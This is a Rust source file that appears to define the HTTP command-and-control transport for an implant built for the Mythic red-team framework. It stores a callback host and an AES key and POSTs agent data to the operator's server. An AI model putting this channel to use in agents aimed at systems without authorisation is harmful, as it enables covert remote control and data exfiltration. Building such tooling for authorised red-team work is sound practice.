//c2 profile

//this is just a testing code for integration purposes into Mythic instance. 
use crate::profiles::C2Profile;
use std::error::Error;

/// Struct holding information for the HTTP profile
pub struct HTTPProfile {
    callback_host: String,
    aes_key: Option<Vec<u8>>,
}

impl HTTPProfile {
    /// Create a new HTTP C2 profile
    /// * `host` - Host for the C2 connection
    pub fn new(host: &str) -> Self {
        // base64 decode the aes key
        let aes_key = profilevars::aes_key().map(|k| base64::decode(k).unwrap());

        Self {
            aes_key,
            callback_host: host.to_string(),
        }
    }
}

impl C2Profile for HTTPProfile {
    /// Required implementation for sending data to the C2
    fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
        // Send an HTTP post request with the data
        http_post(
            format!(
                "{}:{}/{}",
                self.callback_host,
                profilevars::cb_port(),
                profilevars::post_uri()
            )
            .as_str(),
            data,
        )
    }

    /// Gets the AES key from the HTTPProfile
    fn get_aes_key(&self) -> Option<&Vec<u8>> {
        self.aes_key.as_ref()
    }

    /// Sets the AES key for the HTTPProfile
    fn set_aes_key(&mut self, new_key: Vec<u8>) {
        self.aes_key = Some(new_key);
    }
}